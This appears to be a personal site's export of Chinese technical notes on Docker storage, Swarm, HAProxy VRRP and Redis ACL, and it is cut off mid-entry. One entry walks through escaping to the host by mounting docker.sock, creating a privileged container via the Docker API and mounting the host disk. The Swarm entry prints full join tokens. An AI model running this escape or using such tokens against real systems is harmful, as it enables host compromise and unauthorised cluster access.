		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/Docker/Docker overlay2 儲存結構研究/",
		"content": "docker info 查看storage driver\n首先拉取一個Nginx鏡像，然後通過命令docker image inspect nginx查看Nginx鏡像的詳情，每個鏡像都會有一個Data資訊，這個資訊指示了鏡像是怎麼存的。\n查看 image 的詳情\n\n其中 MergedDir 代表當前鏡像層在 overlay2 儲存下的目錄，LowerDir 代表當前鏡像的父層關係，使用冒號分隔，冒號最後代表該鏡像的最底層。\n接著我們進入到任意一個鏡像層看看裡面的結構\n\n**鏡像層的link文件內容為該鏡像層的`短ID\n$ cat link | xargs echo\nDWWRLQXD5ZZYZFLAECXOWA7ODL\n\nlower檔內容為該層的所有父層鏡像的短ID。會用冒號 : 分隔\n$ cat lower | xargs echo\nl/XDQAR5Z4MSK7WNLYDBINB26DK4:l/VPWWG52KMQWNK7K3IMSTON3SRJ:l/UQPY6GNRH4CX3GA66Q75NCAXWN:l/PFGRT5RL3UYLRSI7GXQEOXVLHL:l/IWUVFE4FQR2BE5W5YZIKOYTJWG:l/KEISEPOCFYKYXTNIQQRWTWXGZF:l/JHJ27BDVU264GX5GY2ZHZXINEG:l/HVZVYP2P3H35EVYVSPQRHK6LFQ:l/OGZYCU6IXTZROMPIVINKLUWFJS:l/4FM6QTF6W57G4JUF4S4TSC663T:l/2TRWFLEP26VVMIB2XESNCDKT5R:l/JZ6W4BFQA5LVJOYM5YYX5OHQDU:l/Z4BVWLONYV352YARKDBI4NRZGE:l/N3RDTIUUIJZRVSOAJ6XNSF6YTB:l/G3KDMCGSVUKLBPXEWVYZMPAF4L:l/3TOZSAK6KLMVF3QLT4UIMSBRPB:l/STV7FCMXVMMGPSKOFCZIA7EBOV:l/Y5FZNDARXRLXRZCDNQVL3FFEGB:l/FOI4PWVIXLO6WN7QAUJJMTFJXL\n\n這時候我們再回過頭來看看上面中冒號最後的鏡像層，也就是我們Nginx鏡像父層的最底層是什麼樣的LowerDir\n  &quot;GraphDriver&quot;: {\n&quot;Data&quot;: {\n&quot;LowerDir&quot;: &quot;/var/lib/docker/overlay2/8dde6c69291ee08772fae49713a1ad2a715f5f53195e02ad921d595735316407/diff:/var/lib/docker/overlay2/f707d5dc454841a838102dbd1d702e9c7db107d8d13c25a6c4228daecb42407d/diff:/var/lib/docker/overlay2/0b39f39a877587cad676d3d2c0d078d26a058f51488a34b7918e7d3fe15b9fa6/diff:/var/lib/docker/overlay2/c25343bca009cf414ef51ec190ce5617b663cb601438eff5b03e818b648be94b/diff:/var/lib/docker/overlay2/5d925f8d2a4bc99e52980e08f3aeb08908a565e54f74023544d5a6952562e1b0/diff:/var/lib/docker/overlay2/47b9dc8bbd4059cb7689a3844f1316dc9f258c4f2d54fd3c2263411fac17a6e5/diff&quot;,\n&quot;MergedDir&quot;: &quot;/var/lib/docker/overlay2/da9400108f56bc797caeb9ddfe6b33e71de9cd09355b8d141596ae7606f7a406/merged&quot;,\n&quot;UpperDir&quot;: &quot;/var/lib/docker/overlay2/da9400108f56bc797caeb9ddfe6b33e71de9cd09355b8d141596ae7606f7a406/diff&quot;,\n&quot;WorkDir&quot;: &quot;/var/lib/docker/overlay2/da9400108f56bc797caeb9ddfe6b33e71de9cd09355b8d141596ae7606f7a406/work&quot;\n},\n&quot;Name&quot;: &quot;overlay2&quot;\n},\n\n可以看到它裡面沒有了檔，這是因為他就是最底層了，等於是根鏡像了。 同時，資料夾下的檔，就是我們熟悉的Linux文件目錄結構\nroot@jason-1:/var/lib/docker/overlay2/47b9dc8bbd4059cb7689a3844f1316dc9f258c4f2d54fd3c2263411fac17a6e5/diff# ll\ntotal 68\ndrwxr-xr-x 17 root root 4096 Nov 25 14:44 ./\ndrwx--x--- 3 root root 4096 Nov 25 14:44 ../\nlrwxrwxrwx 1 root root 7 Nov 11 08:00 bin -&gt; usr/bin/\ndrwxr-xr-x 2 root root 4096 Oct 31 19:04 boot/\ndrwxr-xr-x 2 root root 4096 Nov 11 08:00 dev/\ndrwxr-xr-x 29 root root 4096 Nov 11 08:00 etc/\ndrwxr-xr-x 2 root root 4096 Oct 31 19:04 home/\nlrwxrwxrwx 1 root root 7 Nov 11 08:00 lib -&gt; usr/lib/\nlrwxrwxrwx 1 root root 9 Nov 11 08:00 lib64 -&gt; usr/lib64/\ndrwxr-xr-x 2 root root 4096 Nov 11 08:00 media/\ndrwxr-xr-x 2 root root 4096 Nov 11 08:00 mnt/\ndrwxr-xr-x 2 root root 4096 Nov 11 08:00 opt/\ndrwxr-xr-x 2 root root 4096 Oct 31 19:04 proc/\ndrwx------ 2 root root 4096 Nov 11 08:00 root/\ndrwxr-xr-x 3 root root 4096 Nov 11 08:00 run/\nlrwxrwxrwx 1 root root 8 Nov 11 08:00 sbin -&gt; usr/sbin/\ndrwxr-xr-x 2 root root 4096 Nov 11 08:00 srv/\ndrwxr-xr-x 2 root root 4096 Oct 31 19:04 sys/\ndrwxrwxrwt 2 root root 4096 Nov 11 08:00 tmp/\ndrwxr-xr-x 12 root root 4096 Nov 11 08:00 usr/\ndrwxr-xr-x 11 root root 4096 Nov 11 08:00 var/\n\n容器怎麼存儲\n啟動一個Nginx容器，以便觀察Docker創建的容器可寫層，並查看它的配置資訊\n$ docker run --name=nginx -d -v /tmp/test.txt:/tmp/test.txt nginx\n$ docker inspect nginx\n\n進入容器層目錄，看看裡面的結構\n\n進入容器內部\n$ docker exec -it nginx bash\n\n在容器內部建一個檔案，輸入ls -i，會輸出 inode id 為 677855\n\n在宿主機的 diff 層也可以看到該檔案的 inode 為 677855\n\n容器與鏡像的寫時複製技術\n前面我們說到了，一個鏡像的多個容器用到的文件系統就是鏡像的文件系統\n\n為了保證容器的修改不會互相影響，Docker採用了寫時複製技術。\n\nCopy-on-Write特性：\n當容器啟動時，一個新的可寫層被載入到鏡像的頂部。 這一層被稱之為「容器層」，容器層之下的都叫做「鏡像層」。\n所有對容器的改動，無論添加、刪除，還是修改檔都只會發生在容器層中。 只有容器層是可以寫的，容器層下面的所有鏡像層都是只讀的。\n我們在容器中進行操作時：\n- 添加檔: 在容器中創建檔時，新檔被添加到容器層中。\n- 讀取檔: 在容器中讀取某個檔時，Docker會從上往下依次在各鏡像層中查找此檔。 一旦找到，打開並讀入記憶體。\n- 修改檔: 在容器中修改已存在的檔時，Docker會從上往下依次在各鏡像層中查找此檔。 一旦找到，立即將其複製到容器層，然後修改。\n- 刪除檔案: 在容器中刪除檔時，Docker也是從上往下依次在各鏡像層中查找此檔。 找到后，會在容器層中記錄下此刪除操作。\n只有當需要修改時才複製一份數據，這種特性被稱作Copy-on-Write。 可見，容器層保存的鏡像變化的部分，不會對鏡像本身進行任何修改。\n寫時複製不僅節省空間，而且還減少了容器啟動時間。 當你創建一個容器（或者來自同一個鏡像的多個容器）時，Docker 只需要創建可寫容器層即可。\n\n驗證寫時複製技術的過程\n\n$ docker inspect nginx | jq '.[0].GraphDriver.Data.LowerDir' | awk -F: '{for (i=1; i&lt;=NF; i++) print &quot;Layer &quot; i &quot;: &quot; $i}'| sed 's/&quot;//g'\nLayer 1: /var/lib/docker/overlay2/04ad8e4...3b037397e8bdbc5-init/diff\nLayer 2: /var/lib/docker/overlay2/da9400108f56...406/diff\nLayer 3: /var/lib/docker/overlay2/8dde6c6929...6407/diff\nLayer 4: /var/lib/docker/overlay2/f707d5dc454841a8381...407d/diff\nLayer 5: /var/lib/docker/overlay2/0b39f39a877587c...9fa6/diff\nLayer 6: /var/lib/docker/overlay2/c25343bca0...94b/diff\nLayer 7: /var/lib/docker/overlay2/5d9...544d5a6952562e1b0/diff\nLayer 8: /var/lib/docker/overlay2/47b9dc1f...ac17a6e5/diff &lt;-- 最後一層為容器層\n\n再將合併結果寫成跟 Layer 1 去掉 -init 的同樣的目錄名稱作為工作目錄\n\n測試在容器內部修改鏡像層已存在的檔案\n\nBefore\n鏡像層\n$ find $(docker inspect nginx | jq -r '.[0].GraphDriver.Data.LowerDir' | tr ':' ' ') -type f -name &quot;nginx.conf&quot; | xargs ls -i\n\n1882130 /var/snap/docker/common/var-lib-docker/overlay2/227a9d016be667d656c65c1c5440071d45faeb83db145c5482ef812b6c47979f/diff/etc/nginx/nginx.conf\n\n容器內\nroot@592347294aa1:/etc/nginx# ls -i | grep nginx\n\n1882130 nginx.conf\n\n$ UPPER_DIR=$(docker inspect nginx | jq -r '.[0].GraphDriver.Data.UpperDir')\n$ find &quot;$UPPER_DIR&quot; -type f -name &quot;nginx.conf&quot;\n&lt;在 Upper dir 內找不到 nginx.conf檔案，因為現在該檔案在鏡像層只讀&gt;\n\nAfter\n在 container 內修改檔案\nroot@eae0f9d12762:/etc/nginx# echo 123 &gt;&gt; nginx.conf\n\n原始 inode 未改變\nroot@592347294aa1:/etc/nginx# ls -i | grep nginx\n\n1882130 nginx.conf\n\n從宿主機上看在 upper dir 內的 inode 已改變，代表 docker「寫時複製功能」生效，當檔案在鏡像層被修改時，會複製一份到讀寫層\n$ UPPER_DIR=$(docker inspect nginx | jq -r '.[0].GraphDriver.Data.UpperDir')\n$ find &quot;$UPPER_DIR&quot; -type f -name &quot;nginx.conf&quot; | xargs ls -i\n\n1884494 /var/snap/docker/common/var-lib-docker/overlay2/649e271405128d7d52d1b53ea1fef0c7589c191529afe0f89be89ef28778efcf/diff/etc/nginx/nginx.conf\n\nroot@jason-1:/# tail -10 /var/snap/docker/common/var-lib-docker/overlay2/3434bfba1c899d2d7f5bdf407e284410561dc3c5e5b88143072739bbc33e791c/diff/etc/nginx/nginx.conf\nsendfile on;\n#tcp_nopush on;\n\nkeepalive_timeout 65;\n\n#gzip on;\n\ninclude /etc/nginx/conf.d/*.conf;\n}\n123 &lt;-- 被修改\n\n原本處於鏡像層的檔案還是沒改變\n# find $(docker inspect nginx | jq -r '.[0].GraphDriver.Data.LowerDir' | tr ':' ' ') -type f -name &quot;nginx.conf&quot; | xargs ls -i\n\n1882130 /var/snap/docker/common/var-lib-docker/overlay2/227a9d016be667d656c65c1c5440071d45faeb83db145c5482ef812b6c47979f/diff/etc/nginx/nginx.conf\n\nroot@jason-1:/# tail -10 /var/snap/docker/common/var-lib-docker/overlay2/227a9d016be667d656c65c1c5440071d45faeb83db145c5482ef812b6c47979f/diff\n/etc/nginx/nginx.conf\n\nsendfile on;\n#tcp_nopush on;\n\nkeepalive_timeout 65;\n\n#gzip on;\n\ninclude /etc/nginx/conf.d/*.conf;\n}\n\n原因:\n\n在容器內部修改檔案時，inode 不會更新，因為 OverlayFS 只是在上層可寫層中覆蓋檔案內容，而不會對原始鏡像層中的檔案結構進行修改。只有當檔案被刪除或完全替換時，inode 才會更新。\n\n$ MERGED_DIR=$(docker inspect nginx | jq -r '.[0].GraphDriver.Data.MergedDir')\n$ find &quot;$MERGED_DIR&quot; -type f -name &quot;nginx.conf&quot; | xargs ls -i\n\n結論 :\nvim 會在修改檔案時，預設會刪除並覆蓋，所以會改變 inode id，當在 container 內改檔案時， inode id 改變造成 overlay2 無法同步跟外部這份檔案",
		"tags": ["tcp_nopush", "gzip", "tcp_nopush", "gzip", "note","docker","overlay2"]
},

{
		"title": "Docker swarm 研究",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/Docker/Docker swarm 研究/",
		"content": "#docker #docker-swarm\n啟動 docker swarm cluser\n建立 swarm manager\n$ docker swarm init\nSwarm initialized: current node (vft2r90bfk02ybdxwbmomr36w) is now a manager.\n\nTo add a worker to this swarm, run the following command:\n\ndocker swarm join --token SWMTKN-1-10fb01trc9pmy5ullxpsbroxx2mb340xe9oxea47ggdg7xdzni-7jk0smc4a66r450xlsd7isu9j 10.92.0.153:2377\n\nTo add a manager to this swarm, run 'docker swarm join-token manager' and follow the instructions.\n\n根據顯示的指令，將另一個 node 加入到 swarm cluster\n$ ssh a9-test-2\n$ docker swarm join --token SWMTKN-1-10fb01trc9pmy5ullxpsbroxx2mb340xe9oxea47ggdg7xdzni-7jk0smc4a66r450xlsd7isu9j 10.92.0.153:2377\nThis node joined a swarm as a worker.\n\n查看目前 cluster 的加入指令\n$ docker swarm join-token manager\nTo add a manager to this swarm, run the following command:\n\ndocker swarm join --token SWMTKN-1-10fb01trc9pmy5ullxpsbroxx2mb340xe9oxea47ggdg7xdzni-3s6hu2uirlu58ixe6nlakrr49 10.92.0.153:2377\n\n管理目前集群的 node\n$ docker node ls\nID HOSTNAME STATUS AVAILABILITY MANAGER STATUS ENGINE VERSION\nvft2r90bfk02ybdxwbmomr36w * jason-1 Ready Active Leader 27.3.1\nx40thj73emfiyvi1371etqir4 jason-2 Ready Active 27.3.1\n\n在 docker swarm 上建立一個 service\n建立一個 nginx 在 swarm 上成為一個 service\n$ docker service create --name my_web nginx\n\n驗證狀態\n$ docker service ls\nID NAME MODE REPLICAS IMAGE PORTS\ny5rdvf9k7tef vigorous_margulis replicated 1/1 nginx:latest\n\n建立 replicas 2 的一個服務\n這兩個 replica 會在這個 cluster 的兩個 node 上運行，並且將 8080 公開到 node port 上\ndocker service create --name my_web \\\n--replicas 2 \\\n--publish published=8080,target=80 \\\nnginx\n\n訪問任一台 node 的 8080 port 都可以得到 response\n$ curl 10.92.0.154:8080\n\ndocker swarm 建立一個 DaemonSet\n如果將 mode 設定為 global，就會在每個 node 上面建一個 container(類似 k8s daemonset)\n$ docker service create \\\n--mode global \\\n--publish mode=host,target=80,published=8080 \\\n--name=nginx \\\nnginx:latest\n\n$ docker service ls\nID NAME MODE REPLICAS IMAGE PORTS\nwlxtyx45w4qx nginx global 2/2 nginx:latest\n\n以 stack 形式啟動 docker swarm\n支援 docker compose 格式的設定檔\ndocker-compose.yml\nservices:\nweb:\nimage: nginx\nports:\n- &quot;8000:80&quot;\ndeploy:\nmode: global &lt;--- 變成 daemonset 形式，每個 node 都會有一個 container\nredis:\nimage: redis:alpine\n\n建立一個基於 docker compose 的 stack 部署\n$ docker stack deploy --compose-file docker-compose.yml stackdemo\n\n檢查是否正在運行\n$ docker stack services stackdemo\nID NAME MODE REPLICAS IMAGE PORTS\nqyy4hxvdng72 stackdemo_redis replicated 1/1 redis:alpine\ny1b5uyxewmqn stackdemo_web replicated 1/1 nginx:latest *:8000-&gt;80/tcp\n\nLog 系統\n$ docker service logs stackdemo_web -f",
		"tags": ["docker", "docker-swarm", "note","docker-swarm"]
},

{
		"title": "docker 特權逃逸",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/Docker/docker 特權逃逸/",
		"content": "#docker\n起因\n因為 docker daemon 是在 root 權限下\n$ ll -a /var/run/docker.sock\nlrwxr-xr-x 1 root daemon 63B Jun 10 23:39 /var/run/docker.sock -&gt; /Users/jason/.local/share/containers/podman/machine/podman.sock\n\n所以只要能跟 host 的 docker 通訊到，就能透過 docker api 啟動特權容器，進一步取得系統資訊\n建立特權容器\n# 使用 curlimages/curl 作為基礎鏡像\nFROM curlimages/curl:latest\n\nUSER root\n# 安裝 sudo\nRUN apk --no-cache add sudo\n\nRUN apk --no-cache add docker\n\n# 創建一個新用戶並設置適當的權限\nRUN addgroup -S docker &amp;&amp; adduser -S dockeruser -G docker\n\n# 允許 dockeruser 使用 sudo 而不需要密碼\nRUN echo 'dockeruser ALL=(ALL) NOPASSWD:ALL' &gt;&gt; /etc/sudoers\n\n# 切換到 dockeruser 用戶\nUSER dockeruser\n\n# 設置工作目錄\nWORKDIR /home/dockeruser\n\n# 執行一個無限循環的命令，確保容器一直保持運行\nCMD [&quot;sh&quot;, &quot;-c&quot;, &quot;while :; do sleep 10; done&quot;]\n\ndocker build -t my-curl-image .\n\n建立 docker conatiner\ndocker run -it -v /var/run/docker.sock:/var/run/docker.sock my-curl sh\n\n在 container 內使用 docker.sock 的 unix 套接字與 host 的 docker 通訊\n建立一個 docker images\n$ curl -X POST --unix-socket /var/run/docker.sock -d '{&quot;Image&quot;:&quot;my-curl&quot;, &quot;Privileged&quot;:true}' -H 'Content-Type: application/json' http:/v1.24/containers/create\n{&quot;Id&quot;:&quot;315083c9a1035f5f7950eb3302333c17cbd4b6794c61da6be5076763a1ad3330&quot;,&quot;Warnings&quot;:[]}\n\n啟動 docker images\n$ curl -X POST --unix-socket /var/run/docker.sock http:/v1.24/containers/8746e88c9097720c0f6f6a0ab6f4a7fe6677b14c08df9483a71abdab7cad7cbf/start\n\n列出所有 docker container 狀態\n等價:\ndocker ps\n/home/dockeruser # curl --unix-socket /var/run/docker.sock http:/v1.24/containers/json\n[{&quot;Id&quot;:&quot;a9c0fe2d7af9aaf0a2154643c5155ad4eae5254d295528dab4cfde2b42fcf6fa&quot;,&quot;Names&quot;:[&quot;/elated_leakey&quot;],&quot;Image&quot;:&quot;my-curl&quot;,&quot;ImageID&quot;:&quot;sha256:77db03e61147c124f23eda7c588cbd21959fc4645462821877028c8b5236faec&quot;,&quot;Command&quot;:&quot;/entrypoint.sh sh -c 'while :; do sleep 10; done'&quot;,&quot;Created&quot;:1718034\n\n進入建立的特權 container\n$ docker ps\nCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\na9c0fe2d7af9 my-curl &quot;/entrypoint.sh sh -…&quot; 3 minutes ago Up 3 minutes elated_leakey\n\n$ docker exec -it a9c0fe2d7af9 sh\n\n可以看到宿主機的 device\n/dev # ls\nautofs hvc3 loop6 nbd3 ram1 ram9 tty14 tty27 tty4 tty52 tty8 vda\nbtrfs-control hvc4 loop7 nbd4 ram10 random tty15 tty28 tty40 tty53 tty9 vda1\nbus hvc5 mapper nbd5 ram11 rtc0 tty16 tty29 tty41 tty54 ttyS0 vdb\ncachefiles hvc6 mem nbd6 ram12 shm tty17 tty3 tty42 tty55 ttyS1 vdc\ncore hvc7 mqueue nbd7 ram13 stderr tty18 tty30 tty43 tty56 ttyS2 vga_arbiter\ncpu_dma_latency hwrng nbd0 nbd8 ram14 stdin tty19 tty31 tty44 tty57 ttyS3 vhost-net\ncuse kmsg nbd1 nbd9 ram15 stdout tty2 tty32 tty45 tty58 uinput vhost-vsock\nfd loop-control nbd10 net ram2 tty tty20 tty33 tty46 tty59 urandom vport2p0\nfull loop0 nbd11 null ram3 tty0 tty21 tty34 tty47 tty6 vcs vsock\nfuse loop1 nbd12 port ram4 tty1 tty22 tty35 tty48 tty60 vcs1 zero\ngpiochip0 loop2 nbd13 ppp ram5 tty10 tty23 tty36 tty49 tty61 vcsa\nhvc0 loop3 nbd14 ptmx ram6 tty11 tty24 tty37 tty5 tty62 vcsa1\nhvc1 loop4 nbd15 pts ram7 tty12 tty25 tty38 tty50 tty63 vcsu\nhvc2 loop5 nbd2 ram0 ram8 tty13 tty26 tty39 tty51 tty7 vcsu1\n\n修改 host 文件\n$ mount dev/vda1 /home/vda1\n/dev # ls /home/vda1\ncni desktop-containerd kubeadm lost+found mutagen swap\ncontainerd docker kubelet-plugins machine-id nfs wasm",
		"tags": ["docker", "note","docker"]
},

{
		"title": "HA proxy VRRP 研究",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/Proxy/HA proxy VRRP 研究/",
		"content": "#haproxy #vrrp #linux #keepalived #proxy\nVRRP(Virtual Router Redundancy Protocol)\n主要實現工具是 keepalived，他會透過 vrrp 廣播 master 的心跳，一但 master 死掉，Backup 就會代替 Master 回覆指定 IP 的 arp request。\n兩台主機上都有 HA Proxy，接收到請求後會再傳到後端 server\n架構圖\n\n參考教學 : https://medium.com/@abhilashkulkarni340/vrrp-and-4-simple-steps-to-set-it-up-on-ubuntu-454c46abb3b4\n安裝\nhaproxy\n$ sudo apt install haproxy\n$ haproxy -v\nHA-Proxy version 2.0.33-0ubuntu0.1 2023/10/31 - https://haproxy.org/\n\nkeepalived\n$ apt-get install keepalived\n$ systemctl status keepalived\n● keepalived.service - Keepalive Daemon (LVS and VRRP)\nLoaded: loaded (/lib/systemd/system/keepalived.service; enabled; vendor preset: enabled)\nActive: inactive (dead)\nCondition: start condition failed at Thu 2024-11-21 13:47:53 CST; 2h 11min ago\n\nNov 21 13:47:53 jason-2 systemd[1]: Condition check resulted in Keepalive Daemon (LVS and VRRP) being skipped.\n\n出現 inactive 是正常的，因為沒有 keepalived 的設定檔\n所以要從 keepalived config sample 裡面拿到範例設定檔\n$ cp /usr/share/doc/keepalived/samples/keepalived.conf.sample /etc/keepalived/keepalived.conf\n\nVRRP 主備切換環境\n\n設定檔\njason-1(Master)、jason-2(Backup) 兩台測試機的設定檔都要放\njason-1(Master)\n/etc/haproxyhaproxy.cfg\nglobal\n\tlog /dev/log\tlocal0\n\tlog /dev/log\tlocal1 notice\n\tchroot /var/lib/haproxy\n\tstats socket /run/haproxy/admin.sock mode 660 level admin expose-fd listeners\n\tstats timeout 30s\n\tuser haproxy\n\tgroup haproxy\n\tdaemon\n\n\t# Default SSL material locations\n\tca-base /etc/ssl/certs\n\tcrt-base /etc/ssl/private\n\n\t# See: https://ssl-config.mozilla.org/#server=haproxy&amp;server-version=2.0.3&amp;config=intermediate\nssl-default-bind-ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384\nssl-default-bind-ciphersuites TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256\nssl-default-bind-options ssl-min-ver TLSv1.2 no-tls-tickets\n\ndefaults\n\tlog\tglobal\n\tmode\thttp\n\toption\thttplog\n\toption\tdontlognull\ntimeout connect 5000\ntimeout client 50000\ntimeout server 50000\n\terrorfile 400 /etc/haproxy/errors/400.http\n\terrorfile 403 /etc/haproxy/errors/403.http\n\terrorfile 408 /etc/haproxy/errors/408.http\n\terrorfile 500 /etc/haproxy/errors/500.http\n\terrorfile 502 /etc/haproxy/errors/502.http\n\terrorfile 503 /etc/haproxy/errors/503.http\n\terrorfile 504 /etc/haproxy/errors/504.http\n\nfrontend firstbalance\nbind *:80\noption forwardfor\ndefault_backend webservers\n\nbackend webservers\nbalance roundrobin\nserver test-2 10.xx.x.154:8080 check &lt;-- 這個要指定後端 server 位置\n\n/etc/keepalived/keepalived.conf\n! Configuration File for keepalived\n\nglobal_defs {\nrouter_id LVS_DEVEL\n}\n\nvrrp_instance VI_1 {\nstate MASTER # 路由器的首選狀態 - MASTER 或 BACKUP\ninterface ens160 # IP 位址綁定的介面。它還必須添加到 virtual_ipaddress 部分\nunicast_src_ip 10.xx.x.153 # 目前路由器的IP位址\nunicast_peer{\n10.xx.x.154 # VRRP中其他路由器的IP位址\n}\nvirtual_router_id 50\n# nopreempt # nopreempt允許一個priority比較低的節點作為master，即使有priority更高的節點啟動。\npriority 101 # 優先權：該路由器在其他路由器中的優先權\nadvert_int 1\nvirtual_ipaddress {\n\t 10.xx.x.160 # 此部分用於新增虛擬 IP 位址 (VIP)。請注意它如何與 src_ip 和對等點位於同一網路中。\n}\n}\n\njason-2(Backup)\n/etc/haproxyhaproxy.cfg\nglobal\n\tlog /dev/log\tlocal0\n\tlog /dev/log\tlocal1 notice\n\tchroot /var/lib/haproxy\n\tstats socket /run/haproxy/admin.sock mode 660 level admin expose-fd listeners\n\tstats timeout 30s\n\tuser haproxy\n\tgroup haproxy\n\tdaemon\n\n\t# Default SSL material locations\n\tca-base /etc/ssl/certs\n\tcrt-base /etc/ssl/private\n\n\t# See: https://ssl-config.mozilla.org/#server=haproxy&amp;server-version=2.0.3&amp;config=intermediate\nssl-default-bind-ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384\nssl-default-bind-ciphersuites TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256\nssl-default-bind-options ssl-min-ver TLSv1.2 no-tls-tickets\n\ndefaults\n\tlog\tglobal\n\tmode\thttp\n\toption\thttplog\n\toption\tdontlognull\ntimeout connect 5000\ntimeout client 50000\ntimeout server 50000\n\terrorfile 400 /etc/haproxy/errors/400.http\n\terrorfile 403 /etc/haproxy/errors/403.http\n\terrorfile 408 /etc/haproxy/errors/408.http\n\terrorfile 500 /etc/haproxy/errors/500.http\n\terrorfile 502 /etc/haproxy/errors/502.http\n\terrorfile 503 /etc/haproxy/errors/503.http\n\terrorfile 504 /etc/haproxy/errors/504.http\nfrontend firstbalance\nbind *:80\noption forwardfor\ndefault_backend webservers\n\nbackend webservers\nserver test-2 172.xx.x.1:8080 check\n# option httpchk\n\n/etc/keepalived/keepalived.conf\n! Configuration File for keepalived\n\nglobal_defs {\nrouter_id LVS_DEVEL\n}\nvrrp_instance VI_1 {\ninterface ens160\nstate BACKUP\nunicast_src_ip 10.xx.x.154\nunicast_peer{\n10.xx.x.153\n}\nvirtual_router_id 50\n# nopreempt\npriority 101\nadvert_int 1\nvirtual_ipaddress {\n\t 10.xx.x.160\n}\n}\n\n[!TIP] Tip: nopreempt\n允許一個priority比較低的節點作為master，即使有priority更高的節點啟動。\n發生情境:\n其中一台設置為master，一台設置為backup。 當master出現異常后，backup自動切換為master。 當backup成為master后，master恢復正常后會再次搶佔成為master，導致不必要的主備切換。 因此可以將兩台keepalived初始狀態均配置為backup，設置不同的優先順序，優先順序高的設置nopreempt解決異常恢復后再次搶佔的問題。\n\n執行\njason-1(Master)\n$ sudo systemctl restart keepalived\n\njason-2(Backup)\n$ sudo systemctl restart keepalived\n\njason-2 這台目前是 BACKUP mode\n\n實驗\n目前狀態\njason-1 - Master\njason-2 - Backup\n\njason-3 觀測機\narp table 測試\n$ sudo arping 10.xx.x.160\n60 bytes from 00:xx:xx:xx:xx:88 (10.xx.x.160): index=1 time=517.786 usec\n\n現在 10.xx.x.160 是 jason-1(00:xx:xx:xx:88) 所負責的\n\n查看 arp table\n$ arp -a\n...\n? (10.xx.x.160) at 00:xx:xx:xx:xx:88 [ether] on ens160\n...\n\n關閉 jason-1(Master)\nsudo systemctl stop keepalived\n\n發現 jason-2(Backup) 主機接手 Master 位置\n\n到 jason-3 探測機，發現已經迅速切換主備位置了\n\narp table 也同步更新\n\n服務也未中斷\n\nVRRP工作原理\nref: https://info.support.huawei.com/info-finder/encyclopedia/zh/VRRP.html\n當Master設備出現故障時，路由器B和路由器C會選舉出新的Master設備。 新的Master設備開始回應對虛擬IP位址的ARP回應，並定期發送VRRP通告報文。\nVRRP的詳細工作過程如下：\n\nVRRP備份組中的設備根據優先順序選舉出Master。 Master設備通過發送免費ARP報文，將虛擬MAC位址通知給與它連接的設備或者主機，從而承擔報文轉發任務。\nMaster設備週期性向備份組內所有Backup設備發送VRRP通告報文，通告其配置資訊（優先順序等）和工作狀況。\n如果Master設備出現故障，VRRP備份組中的Backup設備將根據優先順序重新選舉新的Master。\nVRRP備份組狀態切換時，Master設備由一台設備切換為另外一台設備，新的Master設備會立即發送攜帶虛擬路由器的虛擬MAC位址和虛擬IP位址資訊的免費ARP報文，刷新與它連接的設備或者主機的MAC表項，從而把使用者流量引到新的Master設備上來，整個過程對使用者完全透明。\n原Master設備故障恢復時，若該設備為IP位址擁有者（優先順序為255），將直接切換至Master狀態。 若該設備優先順序小於255，將首先切換至Backup狀態，且其優先順序恢復為故障前配置的優先順序。\nBackup設備的優先順序高於Master設備時，由Backup設備的工作方式（搶佔方式和非搶佔方式）決定是否重新選舉Master。",
		"tags": ["haproxy", "vrrp", "linux", "keepalived", "proxy", "note","vrrp","haproxy"]
},

{
		"title": "Redis ACL 持久化",
		"date":"Mon Dec 22 2025 02:13:11 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/Redis/Redis ACL 持久化/",
		"content": "主旨\n因為在 <a class=\"internal-link\" target=\"\" data-note-icon=\"\" href=\"/技術文件/Redis/Redis stream 訂閱權限設定/\">Redis stream 訂閱權限設定</a> 時，無法 acl save\n\n故需要設定 aclfile 才能儲存 redis acl 設定\n環境準備\n\n建立 redis\n\ndocker compose\nversion: &quot;3.9&quot;\nservices:\nredis:\nimage: redis:7.2 # Redis 7+ 才支援 ACL 持久化\ncontainer_name: redis_acl\nports:\n- &quot;6379:6379&quot;\nvolumes:\n- ./redis-data:/data # 資料持久化\n- ./redis-acl.conf:/usr/local/etc/redis/redis-acl.conf:ro # 自訂 ACL config\ncommand: [&quot;redis-server&quot;, &quot;/usr/local/etc/redis/redis-acl.conf&quot;]\n\n建立 redis-acl.conf 與 acl 設定檔\ntouch redis-acl.conf\nmkdir -p ./redis-data\ntouch ./redis-data/users.acl\n\n在 redis-acl.conf 填入以下內容\n# redis-acl.conf\nbind 0.0.0.0\nport 6379\n\n# 指定 ACL file\naclfile /data/users.acl\n\n資料夾結構\n.\n├── docker-compose.yml\n├── redis-acl.conf\n└── redis-data\n└── users.acl\n\n2 directories, 3 files\n\n啟動 redis\ndocker compose up -d\n\n連線到 redis\nredis-cli\n\n建立 Redis user\n此使用者只能訂閱 mystream (承 <a class=\"internal-link\" target=\"\" data-note-icon=\"\" href=\"/技術文件/Redis/Redis stream 訂閱權限設定/\">Redis stream 訂閱權限設定</a>)\nACL SETUSER stream_user on &gt;YOUR_PASSWORD +XREAD +XREADGROUP +XRANGE +XINFO ~mystream\n\n儲存 ACL 設定\nacl save\n\n重新啟動 